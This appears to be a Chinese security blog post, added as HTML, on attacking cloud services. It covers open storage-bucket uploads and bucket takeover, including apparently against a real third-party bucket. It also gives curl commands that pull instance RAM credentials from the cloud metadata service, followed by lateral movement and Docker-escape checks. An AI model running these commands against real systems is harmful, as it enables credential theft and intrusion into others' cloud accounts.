@@ -1,0 +1,1028 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/phone_icon/hacker.png">
+  <link rel="icon" href="/img/browser_icon/hacker.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0z-sIHN">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="云上攻防云服务对象储存-Bucket桶对象存储用来存储数据的(图片、视频、音频等，网站在从这个对象存储桶里调用的这些数据)，告别传统的数据放在自己服务器硬盘上。 权限配置不当-任意文件上传​ ​ ​ ​ ​ ​ ​ 设置为公共读或公共读写：可完整访问但不显示完整结构目录，即必须知道具体文件名才能读 ​ ​ 设置ListObject显示完整结构目录 ​ ​ ​ 公共读写直接PUT文件任意上传 ​ ​">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云上攻防">
+<meta property="og:url" content="http://example.com/2024/09/30/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2/index.html">
+<meta property="og:site_name" content="0z-sIHN 的博客">
+<meta property="og:description" content="云上攻防云服务对象储存-Bucket桶对象存储用来存储数据的(图片、视频、音频等，网站在从这个对象存储桶里调用的这些数据)，告别传统的数据放在自己服务器硬盘上。 权限配置不当-任意文件上传​ ​ ​ ​ ​ ​ ​ 设置为公共读或公共读写：可完整访问但不显示完整结构目录，即必须知道具体文件名才能读 ​ ​ 设置ListObject显示完整结构目录 ​ ​ ​ 公共读写直接PUT文件任意上传 ​ ​">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/essay_cover_img/54.png">
+<meta property="article:published_time" content="2024-09-30T06:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-10T14:47:44.477Z">
+<meta property="article:author" content="0z-sIHN">
+<meta property="article:tag" content="云上攻防">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/essay_cover_img/54.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>云上攻防 - 0z-sIHN 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0z-sIHN Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>联系我</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/essay_top_cover_bg/office.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="云上攻防"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-30 14:00" pubdate>
+          2024年9月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">云上攻防</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="云上攻防"><a href="#云上攻防" class="headerlink" title="云上攻防"></a>云上攻防</h1><h1 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h1><h2 id="对象储存-Bucket桶"><a href="#对象储存-Bucket桶" class="headerlink" title="对象储存-Bucket桶"></a>对象储存-Bucket桶</h2><p>对象存储用来存储数据的(图片、视频、音频等，网站在从这个对象存储桶里调用的这些数据)，告别传统的数据放在自己服务器硬盘上。</p>
+<h3 id="权限配置不当-任意文件上传"><a href="#权限配置不当-任意文件上传" class="headerlink" title="权限配置不当-任意文件上传"></a>权限配置不当-任意文件上传</h3><p><img src="/assets/image-20241014165232-39qhq6s.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165422-df2q7b3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165435-jlhvvrb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165517-84f32o6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165530-qm6q66g.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165540-5gj523k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165551-xmgnahw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>设置为公共读或公共读写：可完整访问但不显示完整结构目录，即必须知道具体文件名才能读</p>
+<p><img src="/assets/image-20241014165630-gy1sx16.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165645-ynh9xmo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>设置ListObject显示完整结构目录</p>
+<p><img src="/assets/image-20241014165749-8drsss7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014165804-ri2unh6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014170539-v8h80o4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>公共读写直接PUT文件任意上传</p>
+<p><img src="/assets/image-20241014171144-rl9iwcx.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171153-1u9u3m0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>提示403是因为没有写的权限，只是读的。</p>
+<p><img src="/assets/image-20241014171226-zem5yoe.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171241-zsn4jhe.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>成功上传</p>
+<p><img src="/assets/image-20241014171318-lm3rb7t.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="域名解析接管"><a href="#域名解析接管" class="headerlink" title="域名解析接管"></a>域名解析接管</h3><p><img src="/assets/image-20241014171432-lzzvnhq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171441-4w3qke8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171456-g64b1hm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171548-8qzmzj3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>需要等待一会才会解析生效</p>
+<p><img src="/assets/image-20241014171631-brertk7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171648-5htkhbc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>如何在实战中判断对方域名绑定了OSS存储桶？</p>
+<p><img src="/assets/image-20241014171941-jq92y1x.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014171951-1jx6pgx.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>Bucket存储桶绑定域名后，当存储桶被删除而域名解析未删除，可以尝试接管！(自己去新建一个存储桶，然后去绑定这个域名从而实现接管)</p>
+<p>当Bucket显示<code>NoSuchBucket</code>​说明是可以接管的，如果显示<code>AccessDenied</code>​则不行（这个是根据自己把存储桶删除得到的）</p>
+<p><img src="/assets/image-20241014172211-ivmr9cj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172231-sv4bsut.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172242-kt4z15p.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>注意，新建一个OSS桶的时候，对方用的什么云存储桶你就用什么云存储桶，对方存储桶地域是什么，新建的时候也要选择对应的地域。</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="fofa实战"><a href="#fofa实战" class="headerlink" title="fofa实战"></a>fofa实战</h3><p><img src="/assets/image-20241014172459-c7ztiz6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172509-fpct2ze.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172615-g49ls0i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172626-xiqu90y.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>尝试上传文件</p>
+<p><img src="/assets/image-20241014172650-hz0m7d8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014172709-8yeh4h3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后将sysvod.oss-cn-shenzhen.aliyuncs.com绑定一个域名，这样别人访问该域名时就能展示你的桶的数据</p>
+<p>‍</p>
+<h2 id="弹性计算服务器-元数据"><a href="#弹性计算服务器-元数据" class="headerlink" title="弹性计算服务器-元数据"></a>弹性计算服务器-元数据</h2><p>元数据解释<br>    实例元数据（metadata）包含了弹性计算云服务器实例在阿里云系统中的信息，您可以在运行中的实例内方便地查看实例元数据，并基于实例元数据配置或管理实例。（基本信息：实例ID、IP地址、网卡MAC地址、操作系统类型等信息。实例标识包括实例标识文档和实例标识签名，所有信息均实时生成，常用于快速辨别实例身份。）</p>
+<p>各大云元数据地址</p>
+<blockquote>
+<p>阿里云元数据地址：<a target="_blank" rel="noopener" href="http://100.100.100.200/">http://100.100.100.200/</a><br>腾讯云元数据地址：<a target="_blank" rel="noopener" href="http://metadata.tencentyun.com/">http://metadata.tencentyun.com/</a><br>华为云元数据地址：<a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254/</a><br>亚马云元数据地址：<a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254/</a><br>微软云元数据地址：<a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254/</a><br>谷歌云元数据地址：<a target="_blank" rel="noopener" href="http://metadata.google.internal/">http://metadata.google.internal/</a></p>
+</blockquote>
+<p>细节方面可通过访问官网找元数据访问触发说明<br>阿里云例子：<a target="_blank" rel="noopener" href="https://help.aliyun.com/zh/ecs/user-guide/manage-instance-metadata">https://help.aliyun.com/zh/ecs/user-guide/manage-instance-metadata</a></p>
+<p><img src="/assets/image-20241014174833-cbm2sdh.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>腾讯云例子：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/213/4934">https://cloud.tencent.com/document/product/213/4934</a></p>
+<p><img src="/assets/image-20241014174850-mxisbie.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>弹性计算服务器配置访问控制角色</p>
+<p><img src="/assets/image-20241014180750-xkrpms3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014180801-sgn4n8n.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014180816-zwj7yea.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014180920-hxo6ia8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014180948-dt6zpru.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014181025-seqa7pf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014181041-e21n6qs.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014181111-enxgouo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014181125-42hggsi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）"><a href="#SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）" class="headerlink" title="SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）"></a>SSRF漏洞或已取得某云服务器权限（webshell或漏洞rce可以访问触发url）</h3><p>获取关键角色信息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20241014181352-fn8homp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20241014181408-zuqu0ng.png" srcset="/img/loading.gif" lazyload alt="image">​<img src="/assets/image-20241014181409-rpevi9i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>利用AK横向移动<br>CF 云渗透框架项目：<a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CF/">https://wiki.teamssix.com/CF/</a></p>
+<p><img src="/assets/image-20241014181623-g9r4zfp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>狐狸工具箱有cf</p>
+<p><img src="/assets/image-20241014181707-ozt3eep.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<ol>
+<li><p>先配置云服务商的访问密钥</p>
+<p> <code>cf config</code>​</p>
+<p> <img src="/assets/image-20241014181800-hmhl93x.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20241014181812-bdtnmm9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>获取控制台</p>
+<p> <img src="/assets/image-20241014181907-m243kyt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20241014182045-bduargf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20241014182105-tjk5n6h.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>获取所有的ecs服务器</p>
+<p> <img src="/assets/image-20241014182132-rgskhf1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20241014182144-cxa80ey.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>执行命令(需要先获取ecs服务器)</p>
+<p> <img src="/assets/image-20241014182217-hb3xxtg.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>获取所有oss存储桶</p>
+<p> <img src="/assets/image-20241014182248-sf781zm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20241014182259-6b6if0e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<h3 id="某服务器上Web资产存在SSRF漏洞"><a href="#某服务器上Web资产存在SSRF漏洞" class="headerlink" title="某服务器上Web资产存在SSRF漏洞"></a>某服务器上Web资产存在SSRF漏洞</h3><p><img src="/assets/image-20241014182346-249o6rf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>获取关键角色信息</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/<br>curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<br></code></pre></td></tr></table></figure>
+
+<p>获取ecs临时凭证</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20241014182433-c5mjxts.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>利用AK横向移动</p>
+<p>CF 云渗透框架项目：<a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CF/">https://wiki.teamssix.com/CF/</a></p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h1><p>‍</p>
+<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>‍</p>
+<h3 id="Docker概念"><a href="#Docker概念" class="headerlink" title="Docker概念"></a>Docker概念</h3><p>一个容器技术，类似于VM虚拟机，别人环境封装好打包成一个镜像，使用docker技术就能快速把这个镜像环境还原出来。</p>
+<p>‍</p>
+<h3 id="为什么要进行Docker逃逸？"><a href="#为什么要进行Docker逃逸？" class="headerlink" title="为什么要进行Docker逃逸？"></a>为什么要进行Docker逃逸？</h3><p>攻击者攻击虚拟空间磁盘，拿到最高权限也是虚拟空间的权限，而不是真实物理环境的权限</p>
+<p><img src="/assets/image-20241018113341-81qbigr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="前渗透-判断是否在容器内"><a href="#前渗透-判断是否在容器内" class="headerlink" title="前渗透-判断是否在容器内"></a>前渗透-判断是否在容器内</h3><p>‍</p>
+<p>前提—拿到权限</p>
+<p>‍</p>
+<h4 id="法一：查询cgroup信息"><a href="#法一：查询cgroup信息" class="headerlink" title="法一：查询cgroup信息"></a>法一：查询cgroup信息</h4><p>通过响应的内容可以识别当前进程所处的运行环境，就可以知道是在虚拟机、docker还是kubepods里。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup<br></code></pre></td></tr></table></figure>
+
+<p>docker 环境下</p>
+<p><img src="/assets/image-20241018113951-zuko2fy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>K8s环境下</p>
+<p><img src="/assets/image-20241018114002-4wqm6mc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>虚拟机环境下</p>
+<p><img src="/assets/image-20241018114633-aot4zry.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="法二：检查-dockerenv文件"><a href="#法二：检查-dockerenv文件" class="headerlink" title="法二：检查&#x2F;.dockerenv文件"></a>法二：检查&#x2F;.dockerenv文件</h4><p>通过判断根目录下的 .dockerenv文件是否存在，可以简单的识别docker环境。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -alh /.dockerenv <br></code></pre></td></tr></table></figure>
+
+<p>K8s&amp;docker环境下：ls -alh &#x2F;.dockerenv 可以找到文件</p>
+<p>虚拟机环境下：是没有这个.dockerenv文件的</p>
+<p><img src="/assets/image-20241018115133-q1nubq9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="法三：检查mount信息"><a href="#法三：检查mount信息" class="headerlink" title="法三：检查mount信息"></a>法三：检查mount信息</h4><p>利用mount查看挂载磁盘是否存在docker相关信息</p>
+<p>K8s&amp;docker环境下</p>
+<p><img src="/assets/image-20241018115303-ark4wb0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>虚拟机环境下</p>
+<p><img src="/assets/image-20241018115320-evypsq9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="法四：查看端口运行情况"><a href="#法四：查看端口运行情况" class="headerlink" title="法四：查看端口运行情况"></a>法四：查看端口运行情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -anpt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20241018120226-ejmzho3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="法五：查看硬盘信息"><a href="#法五：查看硬盘信息" class="headerlink" title="法五：查看硬盘信息"></a>法五：查看硬盘信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure>
+
+<p>Docker输出为空，非Docker就会有内容输出</p>
+<p>K8s&amp;docker环境下</p>
+<p><img src="/assets/image-20241018120901-oa1qwd8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>虚拟机环境下</p>
+<p><img src="/assets/image-20241018120935-sa26ps3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="法六：查看文件系统以及挂载点"><a href="#法六：查看文件系统以及挂载点" class="headerlink" title="法六：查看文件系统以及挂载点"></a>法六：查看文件系统以及挂载点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">df -h<br></code></pre></td></tr></table></figure>
+
+<p>检查文件系统挂载的目录，也能够简单判断是否为docker环境</p>
+<p>K8s&amp;docker环境下</p>
+<p><img src="/assets/image-20241018121313-67fk0cj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>虚拟机环境下</p>
+<p><img src="/assets/image-20241018121337-wvj6sgi.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="后渗透-三种安全容器逃逸"><a href="#后渗透-三种安全容器逃逸" class="headerlink" title="后渗透-三种安全容器逃逸"></a>后渗透-三种安全容器逃逸</h3><p>‍</p>
+<h4 id="Privileged特权模式启动"><a href="#Privileged特权模式启动" class="headerlink" title="Privileged特权模式启动"></a>Privileged特权模式启动</h4><p><code>不安全启动，适用于java jsp高权限入口无需提权 低权限入口还要提权才能逃逸</code>​</p>
+<ol>
+<li><h5 id="以特权模式启动靶场"><a href="#以特权模式启动靶场" class="headerlink" title="以特权模式启动靶场"></a>以特权模式启动靶场</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run --rm --privileged=true -it alpine<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018124030-w62meyo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="检测是否是docker环境"><a href="#检测是否是docker环境" class="headerlink" title="检测是否是docker环境"></a>检测是否是docker环境</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;<br><br>根据上面的笔记可以一个一个尝试，不要死脑筋<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018125651-k83yxjp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="判断是否是特权模式"><a href="#判断是否是特权模式" class="headerlink" title="判断是否是特权模式"></a>判断是否是特权模式</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/self/status | grep CapEff<br>或<br>cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;<br></code></pre></td></tr></table></figure>
+
+<p> 在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<p> <img src="/assets/image-20241018130120-wl6o4fz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="查看挂载磁盘设备"><a href="#查看挂载磁盘设备" class="headerlink" title="查看挂载磁盘设备"></a>查看挂载磁盘设备</h5> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fdisk -l<br></code></pre></td></tr></table></figure>
+
+<p> <img src="/assets/image-20241018133847-9vwd0pe.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
